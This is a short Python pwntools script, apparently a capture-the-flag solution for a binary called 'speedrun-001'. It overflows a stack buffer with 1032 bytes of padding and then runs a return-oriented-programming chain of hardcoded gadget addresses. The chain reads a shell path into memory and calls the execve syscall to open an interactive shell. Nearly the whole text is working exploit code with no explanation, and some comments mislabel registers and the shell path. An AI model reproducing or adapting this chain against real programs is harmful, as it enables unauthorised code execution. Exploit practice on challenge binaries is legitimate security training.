from pwn import *
context.terminal = ['tmux' , 'splitw', '-h']

p = process('./speedrun-001')
gdb.attach(p,'''break *0x400ba6''')

pop_rax = 0x415664
pop_rdi = 0x400686
pop_rsi = 0x4101f3
pop_rdx = 0x4498b5
syscall = 0x4498aa
syscall2 = 0x40129c
ret = 0x400416
binbash = 0x6b6000
leave = 0x400bac

# execv('/bin/zsh', 0, 0)
# rax 59, rdi - '/bin/bash', rsi 0, rdi 0

# padding
buf = ""
buf += "A" * 1032

# ssize_t read(int fd, void *buf, size_t count);
# rax 0(stdinput), rdi fd 0, rsi address, rdi size
buf += p64(pop_rax)
buf += p64(0)
buf += p64(pop_rdi)
buf += p64(0)
buf += p64(pop_rsi)
buf += p64(binbash)
buf += p64(pop_rdx)
buf += p64(9)
buf += p64(syscall)

# Syscall execv('/bin/bash',0,0)
buf += p64(pop_rax)
buf += p64(59)
buf += p64(pop_rdi)
buf += p64(binbash)
buf += p64(pop_rsi)
buf += p64(0)
buf += p64(pop_rdx)
buf += p64(0)
buf += p64(syscall2)

p.recvline()
p.sendline(buf)
p.interactive()
